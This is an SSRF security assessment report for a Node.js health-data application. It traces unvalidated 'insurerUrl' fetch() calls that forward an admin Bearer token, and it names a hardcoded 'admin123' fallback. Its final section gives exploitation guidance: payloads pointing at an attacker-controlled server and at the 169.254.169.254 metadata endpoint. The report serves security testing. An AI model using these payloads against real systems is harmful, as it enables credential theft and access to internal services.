# SSRF Analysis Report

## 1. Executive Summary

- **Analysis Status:** Complete
- **Key Outcome:** Three confirmed server-side request forgery vulnerabilities were identified in the Nautilus entity node enrollment routes. Two of these (prescriber, pharmacy) carry a secondary credential-theft impact because the application's admin Bearer token is forwarded unconditionally to the attacker-controlled destination. The entity node ports (4001–4005) are all externally reachable in the test environment. Phase-gating business logic currently prevents immediate trigger on the live instances (nodes already completed enrollment), but the underlying code contains zero URL validation and represents a persistent risk on any fresh deployment. A third potential path via the L2 gossip relay at port 3030 was investigated and found not to propagate injected peer URLs to outbound HTTP connections.
- **Purpose of this Document:** This report provides the strategic context on the application's outbound request mechanisms, dominant flaw patterns, and key architectural details necessary to effectively exploit the vulnerabilities listed in the exploitation queue.

---

## 2. Dominant Vulnerability Patterns

### Pattern 1: Unvalidated User-Controlled `insurerUrl` in Enrollment Routes

- **Description:** Four entity node enrollment routes (`POST /onboarding/enroll` on member, prescriber, pharmacy nodes; `POST /onboarding/configure` on the employer node) accept an `insurerUrl` field directly from the JSON request body. This value is used verbatim in a server-side `fetch()` call with **no URL scheme validation, no allowlist, no private-IP/CIDR check, and no hostname restriction**. The only pre-processing applied in the member route is removal of a trailing slash; the prescriber and pharmacy routes apply no normalisation at all.
- **Implication:** An attacker who can submit a request during the appropriate onboarding phase can force the server to make an outbound POST request to any reachable URL — including cloud metadata endpoints (`169.254.169.254`), internal services, or an attacker-controlled server designed to harvest forwarded credentials.
- **Representative Findings:** `SSRF-VULN-01`, `SSRF-VULN-02`, `SSRF-VULN-03`.

### Pattern 2: Admin Bearer Token Forwarded to SSRF Destination

- **Description:** The prescriber (`prescriber-routes.ts`) and pharmacy (`pharmacy-routes.ts`) enrollment handlers read `server.getConfig().adminToken` and attach it as `Authorization: Bearer <adminToken>` to the outbound `fetch()` request made to the user-supplied URL. This turns a plain SSRF into a direct credential-theft primitive — an attacker who hosts a server at the SSRF destination instantly obtains the sequencer admin token.
- **Implication:** Compromise of the admin token enables full sequencer control: triggering forced batches, injecting formulary/plan data, and bypassing all L2 admin-only methods. The hardcoded fallback `admin123` (used when `ZKTRIDENT_ADMIN_TOKEN` env var is unset in unsecure mode) further widens the impact.
- **Representative Findings:** `SSRF-VULN-01`, `SSRF-VULN-02`.

---

## 3. Strategic Intelligence for Exploitation

- **HTTP Client Library:** Native Node.js `fetch()` (built-in since Node 18/22) is used for all outbound enrollment requests. No wrapper or interceptor is applied.
- **Request Architecture:** Each entity node (member 4001, prescriber 4002, pharmacy 4003, insurer 4004, employer 4005) runs an independent HTTP server via `NautilusAppServer`. Enrollment routes are registered per role and make direct `fetch()` calls to the configured `insurerUrl`. The insurer node itself is the intended *target* of these calls; it receives and processes enrollment POSTs. No outbound HTTP requests are made from the L2 sequencer's own RPC methods.
- **Admin Token Propagation:** `server.getConfig().adminToken` is sourced from the `ZKTRIDENT_ADMIN_TOKEN` environment variable. In unsecure mode (env `ZKTRIDENT_UNSECURE=true`), the fallback is the hardcoded string `admin123` (see `src/nodes/start-leviathan.ts:65`). This same token guards all ~17 admin L2 RPC methods at port 3030.
- **Phase-Gating:** Each node enforces an onboarding phase state machine. The enrollment SSRF fires only when the node is in `wallet_derived` phase. In the current live test deployment all fully-enrolled nodes (prescriber, pharmacy, employer) are in `ready` phase, blocking the immediate trigger path. The member node is in `awaiting_token` phase. A fresh deployment or a state-reset would immediately expose these paths.
- **External Port Exposure (Test Environment):** All five entity node ports were confirmed reachable via `host.docker.internal`: 4001 (200 OK), 4002 (200 OK), 4003 (200 OK), 4004 (200 OK), 4005 (200 OK). Production Render deployment exposes only port 3030 (sequencer), 4004 (insurer), and 4040 (prover) based on `render.yaml`.
- **Gossip / Peer Network:** `l2_gossipRelay` at port 3030 is an admin-only method protected by the same token check. Even if the auth bypass (`!adminToken → return true`) applies, injected `peer:announce` gossip messages containing `knownPeers` URL arrays are **not automatically processed** to open new peer connections. The `handleIncoming()` handler in `l2-peer-network.ts` passes the message to registered observers, but `l2-node.ts` explicitly does not act on `peer:announce` payloads for dynamic peer discovery (seed peers only, lines 875–881). No outbound HTTP is initiated from a gossip injection.

---

## 4. Detailed Sink Analysis

### SSRF-VULN-01 — Prescriber Enrollment SSRF with Admin Token Credential Theft

**Sink location:** `src/nodes/routes/prescriber-routes.ts:242`

**Source-to-Sink Trace:**

```
HTTP POST http://host.docker.internal:4002/onboarding/enroll
  Body: { "insurerUrl": "<ATTACKER_URL>" }

  → prescriber-routes.ts:224   const b = body as { insurerUrl?: string }
  → prescriber-routes.ts:228   [NO VALIDATION — URL used as-is]
  → prescriber-routes.ts:239   const enrollHeaders = { 'Content-Type': 'application/json' }
  → prescriber-routes.ts:240   const adminToken = server.getConfig().adminToken
  → prescriber-routes.ts:241   if (adminToken) enrollHeaders['Authorization'] = `Bearer ${adminToken}`
  → prescriber-routes.ts:242   await fetch(`${b.insurerUrl}/enrollment/process`, {
                                  method: 'POST',
                                  headers: enrollHeaders,   // ← adminToken forwarded here
                                  body: JSON.stringify({ walletId, tokenId, role: 'prescriber' })
                               })
```

**Sanitizers encountered:** None. No scheme check, no host allowlist, no CIDR/private-IP block, no URL parsing.

**Phase gate:** `server.getOnboardingPhase() !== 'wallet_derived'` (line 216) — business logic only, not a security control. Current live state: `ready` (blocks immediate trigger).

**Verdict:** VULNERABLE. User-controlled URL reaches `fetch()` with zero sanitization. Admin credential forwarded to attacker-controlled server.

---

### SSRF-VULN-02 — Pharmacy Enrollment SSRF with Admin Token Credential Theft

**Sink location:** `src/nodes/routes/pharmacy-routes.ts:163`

**Source-to-Sink Trace:**

```
HTTP POST http://host.docker.internal:4003/onboarding/enroll
  Body: { "insurerUrl": "<ATTACKER_URL>" }

  → pharmacy-routes.ts:145   const b = body as { insurerUrl?: string }
  → pharmacy-routes.ts:148   [NO VALIDATION — URL used as-is]
  → pharmacy-routes.ts:160   const enrollHeaders = { 'Content-Type': 'application/json' }
  → pharmacy-routes.ts:161   const adminToken = server.getConfig().adminToken
  → pharmacy-routes.ts:162   if (adminToken) enrollHeaders['Authorization'] = `Bearer ${adminToken}`
  → pharmacy-routes.ts:163   await fetch(`${b.insurerUrl}/enrollment/process`, {
                                  method: 'POST',
                                  headers: enrollHeaders,   // ← adminToken forwarded here
                                  body: JSON.stringify({ walletId, tokenId, role: 'pharmacy' })
                               })
```

**Sanitizers encountered:** None. Identical flaw pattern to SSRF-VULN-01.

**Phase gate:** `server.getOnboardingPhase() !== 'wallet_derived'` (line 137) — current live state: `ready`.

**Verdict:** VULNERABLE.

---

### SSRF-VULN-03 — Member Enrollment SSRF (No Credential Forwarding)

**Sink location:** `src/nodes/routes/member-routes.ts:300`

**Source-to-Sink Trace:**

```
HTTP POST http://host.docker.internal:4001/onboarding/enroll
  Body: { "insurerUrl": "<ATTACKER_URL>" }

  → member-routes.ts:244   const b = body as { insurerUrl?: string }
  → member-routes.ts:245   const insurerUrl = b?.insurerUrl || server.getConfig().insurerUrl || null
  → member-routes.ts:298   const iUrl = insurerUrl.replace(/\/+$/, '')  ← trailing slash removal only
  → member-routes.ts:300   await fetch(`${iUrl}/enrollment/process`, {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({ walletId, tokenId, role: 'member', groupId, planId })
                             })
```

**Sanitizers encountered:** Trailing slash removal only — not a security sanitizer. No scheme, host, or CIDR validation.

**Phase gate:** `server.getOnboardingPhase() !== 'wallet_derived'` (line 233) — current live state: `awaiting_token`. Requires progression through `awaiting_token → token_received → wallet_derived` before the SSRF path is reachable.

**Verdict:** VULNERABLE. Weaker impact than SSRF-VULN-01/02 (no credential forwarding), but still an unrestricted outbound SSRF with user-controlled URL.

---

### Analyzed and Confirmed Not Exploitable — Employer Stored SSRF (SSRF-VULN-04)

**File:** `src/nodes/routes/employer-routes.ts:36–46` → `src/nodes/employer-node.ts:206`

**Flow:** `POST /onboarding/configure` (stores `insurerUrl`) → `POST /tokens/:tokenId/submit` (admin-only, triggers fetch). **Step 1** is currently blocked (`Already configured`). **Step 2** requires admin authentication on the employer node. Even with the L2 admin bypass (hardcoded `admin123`), the Nautilus node's admin check is independent. The stored URL cannot currently be overwritten, and trigger requires admin access. Not included in the exploitation queue.

---

### Analyzed and Confirmed Not Exploitable — Explorer `/viz/*` Proxy (SSRF-VULN-05)

**File:** `src/nodes/start-explorer.ts:134,159`

**Flow:** `GET http://host.docker.internal:8000/viz/<path>?<query>` → `fetch(sequencerUrl + pathname + url.search)`. The `sequencerUrl` is entirely environment-controlled (`ZKTRIDENT_SEQUENCER_URL`). Attackers control the path after `/viz/` and the query string. The destination host is FIXED to the configured sequencer. This allows accessing arbitrary paths on the sequencer with arbitrary query parameters, but does NOT allow redirecting to an arbitrary host. Not classic SSRF. Not included in the queue.

---

### Analyzed and Confirmed Not Exploitable — Gossip Peer URL Injection (SSRF-VULN-06)

**File:** `src/l2/l2-peer-network.ts:122` via `l2_gossipRelay` RPC method

**Flow:** `POST http://host.docker.internal:3030/rpc` with `l2_gossipRelay` method and a `peer:announce` payload containing attacker-controlled `knownPeers` URLs. The method is admin-protected (with potential bypass if `adminToken` is unconfigured). However, code analysis of `handleIncoming()` and `l2-node.ts` confirms that incoming `peer:announce` `knownPeers` arrays are **never processed** to call `connectToPeer()` — the sequencer only connects to pre-configured seed peers. The gossip relay relays messages to already-connected peers but does not initiate new HTTP connections to injected URLs. Not included in the queue.

---

## 5. Secure by Design: Validated Components

These components were analyzed and found to have robust defenses or confirmed not to accept user-controlled URL input. They are low-priority for further testing.

| Component/Flow | Endpoint / File Location | Defense Mechanism Implemented | Verdict |
|---|---|---|---|
| Nautilus RPC Proxy to Sequencer | `src/nodes/nautilus-app-server.ts:401` | Destination host is entirely config-controlled (`sequencerUrl`). Request body forwarded verbatim, but the destination is fixed. No user-supplied host. | SAFE |
| Proof Delegate Client | `src/nodes/proof-delegate.ts:68–203` | `proverUrl` set at construction time from server config, not from any request parameter. No user input reaches the HTTP client. | SAFE |
| CLI Data Importers (NPPES, NADAC) | `src/data/import-nppes.ts:126`, `src/data/import-nadac.ts:80`, `scripts/fetch-nadac.ts:157` | CLI-only scripts with hardcoded target URLs (`npiregistry.cms.hhs.gov`, `download.medicaid.gov`). Not reachable from any network port. | SAFE (out of scope) |
| Explorer `/rpc` and `/events` Proxy | `src/nodes/start-explorer.ts:66,98` | Path and destination are both hardcoded to the configured `sequencerUrl` with no user-supplied path component. | SAFE |
| Gossip Peer Discovery | `src/l2/l2-peer-network.ts:122` via `l2_gossipRelay` | `peer:announce` gossip messages are passed to observers but `knownPeers` arrays are never consumed to call `connectToPeer()`. Peer connections limited to pre-configured seed peers. | SAFE (incomplete feature) |

---

## 6. Exploitation Guidance for Queued Findings

### For SSRF-VULN-01 and SSRF-VULN-02 (Prescriber / Pharmacy + Admin Token)

**Pre-condition to unblock:** The prescriber and pharmacy Nautilus nodes are currently in `ready` phase. The `/onboarding/enroll` endpoint rejects requests with `"Cannot enroll in phase: ready"`. To trigger the SSRF, the node must be in `wallet_derived` phase. Options:

1. **Fresh deployment:** A newly-deployed instance will start in an initial phase and must pass through `wallet_derived` before reaching `ready`. During this window, `insurerUrl` injection is immediately exploitable.
2. **Phase reset via admin:** If admin credentials are known (default `admin123` in unsecure mode), check for any admin reset or re-onboarding endpoint.
3. **Exploit window observation:** Monitor for any node restart or re-provisioning that resets the phase state machine.

**Witness payload:**
```
POST http://host.docker.internal:4002/onboarding/enroll
Content-Type: application/json

{"insurerUrl": "http://<attacker-controlled-server>"}
```
Expected: server issues `POST http://<attacker-controlled-server>/enrollment/process` with header `Authorization: Bearer <adminToken>`.

**For internal service access or cloud metadata:**
```json
{"insurerUrl": "http://169.254.169.254"}
```
Expected: server issues `POST http://169.254.169.254/enrollment/process` (AWS/GCP/Azure instance metadata).

### For SSRF-VULN-03 (Member)

**Pre-condition to unblock:** Member node is in `awaiting_token` phase. Must advance through token receipt and wallet derivation steps before reaching `wallet_derived`. Requires enrolling a member token first (see interactive enrollment routes at port 3030).
